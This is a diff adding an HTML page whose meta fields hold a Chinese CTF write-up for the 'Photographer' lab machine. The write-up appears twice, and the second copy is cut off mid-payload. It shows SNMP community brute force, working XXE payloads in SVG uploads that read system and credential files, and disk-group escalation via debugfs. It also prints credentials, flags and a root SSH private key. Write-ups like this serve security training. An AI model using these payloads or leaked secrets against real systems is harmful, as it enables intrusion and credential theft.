@@ -1,0 +1,1252 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 1. 信息收集
+
+## 1.1. 端口扫描
+
+web质量还可以
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l     
+...
+192.168.205.132 08:00:27:fc:e2:47       PCS Systemtechnik GmbH
+...
+```
+
+192.168.205.132 
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.132          
+...
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+...
+```
+
+## 1.2. Web服务探测
+
+是一个摄影师的博客，他叫**Ethan**，没有找到其他有价值的信息
+
+## 1.3. 漏洞扫描
+
+这里因为Wappalyzer误导了一下，我以为这个是wordpress（误报），所以我进行了nuclei web漏洞扫描（纯纯机缘巧合）
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nuclei -u 192.168.205.132     
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.4.10
+
+                projectdiscovery.io
+...
+[external-service-interaction] [http] [info] http://192.168.205.132
+[external-service-interaction] [http] [info] http://192.168.205.132
+[waf-detect:apachegeneric] [http] [info] http://192.168.205.132
+[ssh-auth-methods] [javascript] [info] 192.168.205.132:22 ['['publickey','password']']
+[ssh-password-auth] [javascript] [info] 192.168.205.132:22
+[ssh-server-enumeration] [javascript] [info] 192.168.205.132:22 ['SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7']
+[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.132:22
+[openssh-detect] [tcp] [info] 192.168.205.132:22 ['SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7']
+[apache-detect] [http] [info] http://192.168.205.132 ['Apache/2.4.65 (Debian)']
+[snmpv1-community-detect-string] [javascript] [high] 192.168.205.132:161 ['photographer'] [community_string='public']
+[snmpv3-detect] [javascript] [info] 192.168.205.132:161 ['net-snmp, Engine ID: 1f88805368bc4066c2f66800000000']
+[options-method] [http] [info] http://192.168.205.132 ['GET,POST,OPTIONS,HEAD']
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.132
+[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.132
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.132
+[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.132
+[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.132
+[INF] Scan completed in 1m. 23 matches found.
+```
+
+snmp找出了一个默认社区字符串`public`，snmp的默认端口是udp的161
+
+# 2. SNMP服务利用
+
+*ps:没接触过snmp的看这:[161,162,10161,10162/udp - Pentesting SNMP](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-snmp/index.html)*
+
+常规利用一下
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ snmpwalk -v 2c -c public 192.168.205.132                                       
+...
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: 'The SNMP Management Architecture MIB.'
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: 'The MIB for Message Processing and Dispatching.'
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: 'The management information definitions for the SNMP User-based Security Model.'
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: 'The MIB module for SNMPv2 entities'
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: 'View-based Access Control Model for SNMP.'
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: 'The MIB module for managing TCP implementations'
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: 'The MIB module for managing UDP implementations'
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: 'The MIB module for managing IP and ICMP implementations'
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: 'The MIB modules for managing SNMP Notification, plus filtering.'
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: 'The MIB module for logging SNMP Notifications.'
+...
+iso.3.6.1.2.1.25.1.4.0 = STRING: 'BOOT_IMAGE=/boot/vmlinuz-6.1.0-40-amd64 root=UUID=77e51563-68a2-4cef-9d02-2b434abfe0dd ro quiet
+'
+...
+```
+
+这个长度不像是正常的snmp输出，应该还有其它的社区字符串，爆破一手
+
+## 2.1. 社区字符串爆破
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.205.132
+Scanning 1 hosts, 120 communities
+192.168.205.132 [public] Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
+192.168.205.132 [public] Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
+192.168.205.132 [security] Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
+```
+
+还存在一个`security`
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ snmpwalk -v 2c -c security 192.168.205.132 |wc -l
+3666
+```
+
+这个长度非常的正确，但是我没扒拉到有价值的，snmp还有一个扩展查询可以查看
+
+## 2.2. 扩展查询获取凭证
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ snmpwalk -v 2c -c security 192.168.205.132 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull.'mycreds' = STRING: ethan:1N3qVgwNB6cZmNSyr8iX$!
+```
+
+`ethan:1N3qVgwNB6cZmNSyr8iX$!`
+
+给了我们一串凭证，经过测试ssh直接连接无效，白日梦破碎
+
+那就是web了，目录爆破
+
+# 3. Web目录爆破
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -q -u http://192.168.205.132       
+...
+[23:05:54] 200 -    1KB - http://192.168.205.132/about.html
+[23:05:54] 301 -  318B  - http://192.168.205.132/admin  ->  http://192.168.205.132/admin/
+[23:05:54] 200 -  536B  - http://192.168.205.132/admin/
+[23:05:54] 302 -    1KB - http://192.168.205.132/admin/admin.php  ->  index.php
+[23:05:54] 200 -  536B  - http://192.168.205.132/admin/index.php
+[23:05:54] 500 -    0B  - http://192.168.205.132/admin/upload.php
+[23:05:56] 301 -  319B  - http://192.168.205.132/assets  ->  http://192.168.205.132/assets/
+[23:05:56] 200 -  476B  - http://192.168.205.132/assets/
+[23:05:59] 301 -  319B  - http://192.168.205.132/images  ->  http://192.168.205.132/images/
+[23:05:59] 200 -  529B  - http://192.168.205.132/images/
+[23:06:02] 403 -  280B  - http://192.168.205.132/server-status/
+[23:06:02] 403 -  280B  - http://192.168.205.132/server-status
+```
+
+有个admin管理登录页，有uploads上传页，目前推测通过上传拿shell
+
+使用凭证进行登录
+
+# 4. XXE漏洞利用
+
+果然是上传利用，通过测试和看前端的源码，发现只可以上传`.jpg,.png,.gif,.jpeg`（存疑），并且貌似是启用了**MIME Type检测**
+
+## 4.1. SVG文件上传测试
+
+经过短暂的测试，大部分常规利用都无法利用，但是在上传svg的时候（我制作了一个包含php利用的svg）有明显的处理的痕迹，他处理svg文件的时间非常久，这在我们本地靶机的情况下是很少见的，SVG 作为一种基于 XML 的格式，很有可能可以用来利用XXE
+
+*参考资料:[SVG - 文件上传](https://book.hacktricks.wiki/zh/pentesting-web/xxe-xee-xml-external-entity.html?highlight=svg#svg---%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)*
+
+## 4.2. 文件读取
+
+先尝试利用文件读取（hacktricks的攻击示例写的好像有点问题，它利用了image标签，不是很理解，我们自己改一下）
+
+```xml
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]>
+<svg xmlns='http://www.w3.org/2000/svg'>
+  <text x='0' y='20'>&xxe;</text>
+</svg>
+```
+
+成功回显，发现存在**ethan**用户，读取ssh私钥无果
+
+试试命令执行
+
+*ps:expect包装器通常不开，试试吧，不吃亏*
+
+```xml
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM 'expect://id'> ]>
+<svg xmlns='http://www.w3.org/2000/svg'>
+  <text x='0' y='20'>&xxe;</text>
+</svg>
+```
+
+没有显示无法利用
+
+## 4.3. Apache配置文件读取
+
+这里想读一下`/admin/index.php`的源码，但是默认路径`/var/www/html`不对，没有回显，扒拉一下路径
+
+已知是apache的服务，看看配置文件
+
+```xml
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM 'file:///etc/apache2/apache2.conf'> ]>
+<svg xmlns='http://www.w3.org/2000/svg'>
+  <text x='0' y='20'>&xxe;</text>
+</svg>
+```
+
+然后就炸了......状态码500
+
+应该是文本太多的问题，试试`php_filter`链（想直接执行命令的有点难度，太长了，它会解析到）
+
+````xml
+<?xml version='1.0' standalone='yes'?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf' > ]>
+<svg width='500px' height='2000px' xmlns='http://www.w3.org/2000/svg'>
+   <text font-size='10' x='0' y='20'>&xxe;</text>
+</svg>
+````
+
+拿到了一个大概的位置`sites-enabled/*.conf`，但是默认的`000-default.conf`返回是空的，所以直接爆破一手
+
+拿`directory-list-2.3-medium.txt`爆破的
+
+应该是速度太快跑蒙了，他显示`web、library、wik`i的长度都为641，结果查看是同一base64
+
+解出来
+
+```php
+<VirtualHost *:80>
+    ServerName photographer.thl
+    DocumentRoot /var/www/blog
+
+    ErrorLog ${APACHE_LOG_DIR}/photographer_error.log
+    CustomLog ${APACHE_LOG_DIR}/photographer_access.log combined
+</VirtualHost>
+
+```
+
+look look
+
+```xml
+<?xml version='1.0' standalone='yes'?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/blog/admin/index.php' > ]>
+<svg width='500px' height='2000px' xmlns='http://www.w3.org/2000/svg'>
+   <text font-size='10' x='0' y='20'>&xxe;</text>
+</svg>
+```
+
+看了一下，数据库密码在db.php，我们看一下数据库密码，看他有没有密码复用
+
+## 4.4. 数据库凭证获取
+
+```xml
+<?xml version='1.0' standalone='yes'?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/blog/admin/db.php' > ]>
+<svg width='500px' height='2000px' xmlns='http://www.w3.org/2000/svg'>
+   <text font-size='10' x='0' y='20'>&xxe;</text>
+</svg>
+```
+
+解出
+
+```php
+<?php
+$host = 'localhost';
+$db = 'blog';
+$user = 'root';
+$pass = 'pjtF0533OPiSMQTGZacZY6jy$';
+
+$conn = new mysqli($host, $user, $pass, $db);
+if ($conn->connect_error) {
+    die('Conexión fallida: ' . $conn->connect_error);
+}
+```
+
+# 5. SSH登录与权限提升
+
+## 5.1. 密码复用测试
+
+测试一下                 *做一下白日梦:)*
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh root@192.168.205.132                                                          
+root@192.168.205.132's password: 
+Permission denied, please try again.
+root@192.168.205.132's password: 
+  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh ethan@192.168.205.132
+ethan@192.168.205.132's password: 
+Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠶⣞⡩⠽⢷⣆⣀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣀⡤⢿⠀⢹⠖⠒⡛⠧⠐⠉⣧⠀⠀⠀⠀
+⠀⢀⡠⠴⣲⣭⡁⠲⠇⢈⡑⢚⠪⠭⠤⠤⢄⣀⣿⠀⠀⠀⠀
+⢠⠃⠤⠄⠉⠉⠀⠐⠉⣡⠞⠁⢀⡴⠞⠉⢉⣩⠿⠶⣄⠀
+⢸⠀⠀⠀⠀⡄⠀⠀⣰⠃⠀⢠⡞⠀⠀⡴⢋⣴⣿⣿⣷⡘⣆
+⢸⠀⠀⠀⠀⡇⠀⠀⡏⠀⠀⣾⠀⠀⡜⢀⣾⣿⣤⣾⣿⡇⣿
+⢨⠀⠀⠀⠀⡇⠀⠀⣇⠀⠀⡏⠀⠀⡇⢸⣿⣿⣿⣿⣿⢁⡏
+⠈⠀⣀⠀⠀⣷⠀⠀⠘⢄⠀⢳⠀⠀⡇⠸⣿⣿⣹⡿⢃⡼⠁
+⢰⡀⠛⠓⠀⢻⠀⠀⠀⠀⢙⣻⡷⠦⣼⣦⣈⣉⣡⡴⠚⠀⠀
+⠀⢷⣄⡀⠀⠀⠀⢀⡠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠉⠛⠓⠒⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Photographer
+
+Last login: Tue Oct 28 19:47:04 2025 from 192.168.1.17
+ethan@photographer:~$ id
+uid=1001(ethan) gid=1001(ethan) grupos=1001(ethan),6(disk)
+```
+
+一眼丁真，`6(disk)`可以直接读东西
+
+## 5.2. disk组权限利用
+
+```bash
+ethan@photographer:~$ df -h
+S.ficheros     Tamaño Usados  Disp Uso% Montado en
+udev             965M      0  965M   0% /dev
+tmpfs            197M   552K  197M   1% /run
+/dev/sda1         19G   2,6G   16G  15% /
+tmpfs            984M      0  984M   0% /dev/shm
+tmpfs            5,0M      0  5,0M   0% /run/lock
+tmpfs            197M      0  197M   0% /run/user/1001
+ethan@photographer:~$ debugfs /dev/sda1
+-bash: debugfs: orden no encontrada
+ethan@photographer:~$ which debugfs
+ethan@photographer:~$ find / -name 'debugfs' 2>/dev/null
+/usr/sbin/debugfs
+```
+
+## 5.3. Flag获取
+
+藏起来了
+
+```bash
+debugfs:  cat /root/root.txt
+dc54639c5bd88637cc23dd7dd1827bbf
+debugfs:  cat /home/ethan/user.txt
+3fd75fcad59cce5c0bbb0f1a52b04ebd
+debugfs:  cat /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+wyij4+RkfxUm0AAAALcm9vdEBkZWJpYW4=
+-----END OPENSSH PRIVATE KEY-----
+```。">
+<meta property="og:title" content="thl_Photographer">
+<meta property="og:description" content="# 1. 信息收集
+
+## 1.1. 端口扫描
+
+web质量还可以
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l     
+...
+192.168.205.132 08:00:27:fc:e2:47       PCS Systemtechnik GmbH
+...
+```
+
+192.168.205.132 
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.132          
+...
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+...
+```
+
+## 1.2. Web服务探测
+
+是一个摄影师的博客，他叫**Ethan**，没有找到其他有价值的信息
+
+## 1.3. 漏洞扫描
+
+这里因为Wappalyzer误导了一下，我以为这个是wordpress（误报），所以我进行了nuclei web漏洞扫描（纯纯机缘巧合）
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nuclei -u 192.168.205.132     
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.4.10
+
+                projectdiscovery.io
+...
+[external-service-interaction] [http] [info] http://192.168.205.132
+[external-service-interaction] [http] [info] http://192.168.205.132
+[waf-detect:apachegeneric] [http] [info] http://192.168.205.132
+[ssh-auth-methods] [javascript] [info] 192.168.205.132:22 ['['publickey','password']']
+[ssh-password-auth] [javascript] [info] 192.168.205.132:22
+[ssh-server-enumeration] [javascript] [info] 192.168.205.132:22 ['SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7']
+[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.132:22
+[openssh-detect] [tcp] [info] 192.168.205.132:22 ['SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7']
+[apache-detect] [http] [info] http://192.168.205.132 ['Apache/2.4.65 (Debian)']
+[snmpv1-community-detect-string] [javascript] [high] 192.168.205.132:161 ['photographer'] [community_string='public']
+[snmpv3-detect] [javascript] [info] 192.168.205.132:161 ['net-snmp, Engine ID: 1f88805368bc4066c2f66800000000']
+[options-method] [http] [info] http://192.168.205.132 ['GET,POST,OPTIONS,HEAD']
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.132
+[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.132
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.132
+[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.132
+[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.132
+[INF] Scan completed in 1m. 23 matches found.
+```
+
+snmp找出了一个默认社区字符串`public`，snmp的默认端口是udp的161
+
+# 2. SNMP服务利用
+
+*ps:没接触过snmp的看这:[161,162,10161,10162/udp - Pentesting SNMP](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-snmp/index.html)*
+
+常规利用一下
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ snmpwalk -v 2c -c public 192.168.205.132                                       
+...
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: 'The SNMP Management Architecture MIB.'
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: 'The MIB for Message Processing and Dispatching.'
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: 'The management information definitions for the SNMP User-based Security Model.'
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: 'The MIB module for SNMPv2 entities'
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: 'View-based Access Control Model for SNMP.'
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: 'The MIB module for managing TCP implementations'
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: 'The MIB module for managing UDP implementations'
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: 'The MIB module for managing IP and ICMP implementations'
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: 'The MIB modules for managing SNMP Notification, plus filtering.'
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: 'The MIB module for logging SNMP Notifications.'
+...
+iso.3.6.1.2.1.25.1.4.0 = STRING: 'BOOT_IMAGE=/boot/vmlinuz-6.1.0-40-amd64 root=UUID=77e51563-68a2-4cef-9d02-2b434abfe0dd ro quiet
+'
+...
+```
+
+这个长度不像是正常的snmp输出，应该还有其它的社区字符串，爆破一手
+
+## 2.1. 社区字符串爆破
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.205.132
+Scanning 1 hosts, 120 communities
+192.168.205.132 [public] Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
+192.168.205.132 [public] Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
+192.168.205.132 [security] Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
+```
+
+还存在一个`security`
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ snmpwalk -v 2c -c security 192.168.205.132 |wc -l
+3666
+```
+
+这个长度非常的正确，但是我没扒拉到有价值的，snmp还有一个扩展查询可以查看
+
+## 2.2. 扩展查询获取凭证
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ snmpwalk -v 2c -c security 192.168.205.132 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull.'mycreds' = STRING: ethan:1N3qVgwNB6cZmNSyr8iX$!
+```
+
+`ethan:1N3qVgwNB6cZmNSyr8iX$!`
+
+给了我们一串凭证，经过测试ssh直接连接无效，白日梦破碎
+
+那就是web了，目录爆破
+
+# 3. Web目录爆破
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -q -u http://192.168.205.132       
+...
+[23:05:54] 200 -    1KB - http://192.168.205.132/about.html
+[23:05:54] 301 -  318B  - http://192.168.205.132/admin  ->  http://192.168.205.132/admin/
+[23:05:54] 200 -  536B  - http://192.168.205.132/admin/
+[23:05:54] 302 -    1KB - http://192.168.205.132/admin/admin.php  ->  index.php
+[23:05:54] 200 -  536B  - http://192.168.205.132/admin/index.php
+[23:05:54] 500 -    0B  - http://192.168.205.132/admin/upload.php
+[23:05:56] 301 -  319B  - http://192.168.205.132/assets  ->  http://192.168.205.132/assets/
+[23:05:56] 200 -  476B  - http://192.168.205.132/assets/
+[23:05:59] 301 -  319B  - http://192.168.205.132/images  ->  http://192.168.205.132/images/
+[23:05:59] 200 -  529B  - http://192.168.205.132/images/
+[23:06:02] 403 -  280B  - http://192.168.205.132/server-status/
+[23:06:02] 403 -  280B  - http://192.168.205.132/server-status
+```
+
+有个admin管理登录页，有uploads上传页，目前推测通过上传拿shell
+
+使用凭证进行登录
+
+# 4. XXE漏洞利用
+
+果然是上传利用，通过测试和看前端的源码，发现只可以上传`.jpg,.png,.gif,.jpeg`（存疑），并且貌似是启用了**MIME Type检测**
+
+## 4.1. SVG文件上传测试
+
+经过短暂的测试，大部分常规利用都无法利用，但是在上传svg的时候（我制作了一个包含php利用的svg）有明显的处理的痕迹，他处理svg文件的时间非常久，这在我们本地靶机的情况下是很少见的，SVG 作为一种基于 XML 的格式，很有可能可以用来利用XXE
+
+*参考资料:[SVG - 文件上传](https://book.hacktricks.wiki/zh/pentesting-web/xxe-xee-xml-external-entity.html?highlight=svg#svg---%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)*
+
+## 4.2. 文件读取
+
+先尝试利用文件读取（hacktricks的攻击示例写的好像有点问题，它利用了image标签，不是很理解，我们自己改一下）
+
+```xml
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]>
+<svg xmlns='http://www.w3.org/2000/svg'>
+  <text x='0' y='20'>&xxe;</text>
+</svg>
+```
+
+成功回显，发现存在**ethan**用户，读取ssh私钥无果
+
+试试命令执行
+
+*ps:expect包装器通常不开，试试吧，不吃亏*
+
+```xml
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM 'expect://id'> ]>
+<svg xmlns='http://www.w3.org/2000/svg'>
+  <text x='0' y='20'>&xxe;</text>
+</svg>
+```
+
+没有显示无法利用
+
+## 4.3. Apache配置文件读取
+
+这里想读一下`/admin/index.php`的源码，但是默认路径`/var/www/html`不对，没有回显，扒拉一下路径
+
+已知是apache的服务，看看配置文件
+
+```xml
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM 'file:///etc/apache2/apache2.conf'> ]>
+<svg xmlns='http://www.w3.org/2000/svg'>
+  <text x='0' y='20'>&xxe;</text>
+</svg>
+```
+
+然后就炸了......状态码500
+
+应该是文本太多的问题，试试`php_filter`链（想直接执行命令的有点难度，太长了，它会解析到）
+
+````xml
+<?xml version='1.0' standalone='yes'?>
